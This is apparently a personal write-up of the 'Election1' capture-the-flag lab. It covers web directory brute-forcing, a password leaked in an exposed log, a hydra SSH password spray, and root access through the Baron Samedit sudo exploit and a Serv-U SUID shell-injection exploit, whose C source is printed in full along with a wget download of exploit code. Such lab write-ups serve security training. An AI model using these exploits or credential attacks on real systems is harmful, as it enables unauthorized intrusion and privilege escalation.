<html>
  <head>
    <link rel="icon" href="/assets/imgs/beans.png" type="image/png">
  </head>
  <img src="/assets/imgs/beans.png" alt="Logo" style="position: absolute; top: 0; left: 0; width: 200px; height: auto;">
</html>

[Main Page](/index)


# Election1

---

Today’s challenge is `Election1` from OffSec’s proving grounds!

So I first started with an nmap scan! I usually scan all tcp ports like so:

```
nmap -p- --max-rate 1000 -T5 <ip>
```

This returned with just ports 22 and 80, SSH and a Webserver. I will then take the open ports and run a service and scripts scan on them

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 22:28 EST
Nmap scan report for 192.168.211.211
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.20 seconds
```

The ssh version isn’t vulnerable to anything, but the webserver looks like a default apache web page.

![image.png](image%202.png)

This leaks the apache version. There is nothing in the source code, so lets try and bruteforce some directories.

```
$ gobuster dir -u http://192.168.211.211/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.211.211/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.211.211/javascript/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.211.211/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 95443]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 280]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The `phpinfo.php` leaks the php version.
`Edit:` After completing this box and reading some writeups, I completely missed the phpmyadmin! When I originally went to the directory I got a 403, but if you navigate to `phpmyadmin/index.php` you can login with the default creds `root:toor` and actually allows you to change the password for the `love` user (more below). While this didn't directly lead to a foodhold on the machine, it most certainly have been a huge finding had this been a pentest!

![image.png](image%203.png)

The robots.txt file is interesing!

![image.png](image%204.png)

All of these return a 404 accept for the election directory!

![image.png](image%205.png)

![image.png](image%206.png)

This is some kind of election website and after some research I found this page on it [Here](https://sourceforge.net/projects/election-by-tripath/), as well as the creator’s page [Here](https://fauzantrif.wordpress.com/2019/10/16/election-update-releases/).

This shows us the versions and what files are updated for each version which is very useful! It allows us to find out which version we have. After some research, the 2.0 version of eLection has a [SQLi-To-RCE vulnerability](https://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md) that we can abuse if we have the admin credentials!

However, after looking at these changelogs by the creator:

![image.png](image%207.png)

And testing to see if we have these files, sure enough we do which means ours is the patched `2.1` verson :(

But we do find the `/admin` login page! And we can find some others with gobuster too.

![image.png](image%208.png)

```
$ gobuster dir -u http://192.168.211.211/election -w /usr/share/wordlists/dirb/common.txt                             
===============================================================                                                         
Gobuster v3.6                                                                                                           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                           
===============================================================                                                         
[+] Url:                     http://192.168.211.211/election                                                            
[+] Method:                  GET                                                                                        
[+] Threads:                 10                                                                                         
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt                                                       
[+] Negative Status codes:   404                                                                                        
[+] User Agent:              gobuster/3.6                                                                               
[+] Timeout:                 10s                                                                                        
===============================================================                                                         
Starting gobuster in directory enumeration mode                                                                         
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/admin                (Status: 301) [Size: 327] [--> http://192.168.211.211/election/admin/]
/data                 (Status: 301) [Size: 326] [--> http://192.168.211.211/election/data/]
/index.php            (Status: 200) [Size: 7003]
/js                   (Status: 301) [Size: 324] [--> http://192.168.211.211/election/js/]
/languages            (Status: 301) [Size: 331] [--> http://192.168.211.211/election/languages/]
/lib                  (Status: 301) [Size: 325] [--> http://192.168.211.211/election/lib/]
/media                (Status: 301) [Size: 327] [--> http://192.168.211.211/election/media/]
/themes               (Status: 301) [Size: 328] [--> http://192.168.211.211/election/themes/]
===============================================================
Finished
===============================================================
```

I was able to find default admin id of `1234` [here](https://sourceforge.net/p/election-by-tripath/wiki/Documentation%20-%20Installer%20Guide/).

The id worked and the login prompt showed us it belonged to the admin user `love` but the password was different than the default. I hit a roadblock here UNTIL I ended up running gobuster ONCE AGAIN but on our admin directory.

```
$ gobuster dir -u http://192.168.211.211/election/admin -w /usr/share/wordlists/dirb/common.txt                       
===============================================================                                                         
Gobuster v3.6                                                                                                           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                           
===============================================================
[+] Url:                     http://192.168.211.211/election/admin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/ajax                 (Status: 301) [Size: 332] [--> http://192.168.211.211/election/admin/ajax/]
/components           (Status: 301) [Size: 338] [--> http://192.168.211.211/election/admin/components/]
/css                  (Status: 301) [Size: 331] [--> http://192.168.211.211/election/admin/css/]
/img                  (Status: 301) [Size: 331] [--> http://192.168.211.211/election/admin/img/]
/inc                  (Status: 301) [Size: 331] [--> http://192.168.211.211/election/admin/inc/]
/index.php            (Status: 200) [Size: 8964]
/js                   (Status: 301) [Size: 330] [--> http://192.168.211.211/election/admin/js/]
/logs                 (Status: 301) [Size: 332] [--> http://192.168.211.211/election/admin/logs/]
/plugins              (Status: 301) [Size: 335] [--> http://192.168.211.211/election/admin/plugins/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

`/logs` caught my eye because it wasn’t in the update listing!

![image.png](image%209.png)

![image.png](image%2010.png)

Well well well. A misconfigured log file that gives us a juicy little password. This password does not work for our `love` admin on the website, so my next guess is ssh!

I made a little possible users file from the home page:

```
$ cat users
admin1
love
Love
administrator
Administrator
admin
```

And then used hydra to spray the password to all the users and got a hit!

```
$ hydra -L users -p 'P@$$w0rd@123' 192.168.211.211 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-04 23:48:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://192.168.211.211:22/
[22][ssh] host: 192.168.211.211   login: love   password: P@$$w0rd@123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-04 23:48:30
```

We can now ssh into the box. Time for some numeration.

![image.png](image%2011.png)

```
love@election:~$ sudo -l
[sudo] password for love:
Sorry, user love may not run sudo on election.
love@election:~$ id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
love@election:~$ uname -a
Linux election 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
love@election:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
love@election:~$ cat local.txt
597b[redacted]
```

Got the user flag! Time for some priv esc.

I then started a python web server with `python3 -m http.server` and transfered linpeas over to our temp folder and ran it

![image.png](image%2012.png)

We can change the

 permissions to executable with `chmod +x linpeas.sh` and run it with `./linpeas.sh`
Turns out we have access to the mysql service! Using the default credentials `root : toor` .

```
MySQL connection using root/toor ................... Yes                                                             
User    Host    authentication_string                                                                                   
root    localhost                                                                                                       
newuser localhost
```

```
love@election:~$ mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 23
Server version: 10.1.44-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

<..snip..>

MariaDB [(none)]> use election;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [election]> show tables
    -> ;                                                                                                                             
+--------------------+
| Tables_in_election |
+--------------------+
| tb_guru            |
| tb_hakpilih        |
| tb_kandidat        |
| tb_level           |
| tb_panitia         |
| tb_pengaturan      |
| tb_polling         |
| tb_siswa           |
+--------------------+
8 rows in set (0.00 sec)

MariaDB [election]>
```

But it doesn’t really give us anything. The next thing I decided to try was testing the sudo version as linpeas gave us this:

```
Sudo version 1.8.21p2
```

This is an old version possibly vulnerable to CVE-2021-3156, Sudo Baron Samedit. I got this python eploit from here to test it:

[https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)

And went ahead and picked [This Once](https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py).

I then transferred it with our python webserver and fingers crossed!

```
love@election:/tmp$ wget 192.168.45.198:8000/exploit_nss.py
--2025-03-05 10:26:50--  http://192.168.45.198:8000/exploit_nss.py
Connecting to 192.168.45.198:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8179 (8.0K) [text/x-python]
Saving to: ‘exploit_nss.py’

exploit_nss.py                    100%[==========================================================>]   7.99K  --.-KB/s    in 0.1s

2025-03-05 10:26:51 (58.3 KB/s) - ‘exploit_nss.py’ saved [8179/8179]

love@election:/tmp$ python3 exploit_nss.py
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
# cd /root
# cat proof.txt                                                                                                                      
bc26[redacted]
```

Boom! It worked. We are now root!
However! Turns out this was not the intended way.

If we check for suid binaries like so:

```
love@election:~$ find / -perm -u=s -type f 2>/dev/null                                                                  /usr/bin/arping                                                                                                         /usr/bin/passwd                                                                                                         /usr/bin/pkexec                                                                                                         /usr/bin/traceroute6.iputils                                                                                            /usr/bin/newgrp                                                                                                         /usr/bin/chsh                                                                                                           /usr/bin/chfn                                                                                                           /usr/bin/gpasswd                                                                                                        /usr/bin/sudo                                                                                                           /usr/sbin/pppd                                                                                                          /usr/local/Serv-U/Serv-U                                                                                                /usr/lib/policykit-1/polkit-agent-helper-1                                                                              /usr/lib/eject/dmcrypt-get-device                                                                                       /usr/lib/openssh/ssh-keysign                                                                                            /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                             /usr/lib/xorg/Xorg.wrap                                                                                                 /bin/fusermount                                                                                                         /bin/ping
```

We get this interesting `Serv-U` file.

```
love@election:~$ cd /usr/local/Serv-U/
love@election:/usr/local/Serv-U$ ls
 Client                 Scripts                 Serv-U-DefaultCertificate.crt               Serv-U-Tray    uninstall
'Custom HTML Samples'   Serv-U                  Serv-U-DefaultCertificate.key               Shares
 Images                 Serv-U.Archive         'Serv-U Integration Sample Shared Library'   Strings
 Legal                  Serv-U.Archive.Backup   Serv-U-StartupLog.txt                      'Tray Themes'
love@election:/usr/local/Serv-U$
```

Doing some research, there is a [Local Privilege Escalation Exploit](https://www.exploit-db.com/exploits/47009) on our lovely exploit-db. The exploit code is short and looks like this:

```
/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

We can read about how the exploit works [Here](https://blog.vastart.dev).
We have gcc on the machine

```
love@election:/usr/local/Serv-U$ which gcc
/usr/bin/gcc
```

So let's transfer our exploit code, compile, and fire away!

```
love@election:/tmp$ gcc exploit.c -o pe
love@election:/tmp$ ./pe
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
#
```

And boom! Root!

In summary, we enumerated the webserver by bruteforcing directories. We found the `love` user as well as a public facing log file containing a password. The password was reused as the `love` user’s password on SSH, which had password authentication enabled. From there, we were able to both, a) abuse an outdated version of sudo to escalate our privileges using the `sudo baron samedit` exploit, or b) abuse the outdated Serv-U FTP suid executable via a shell injection vulnerability.
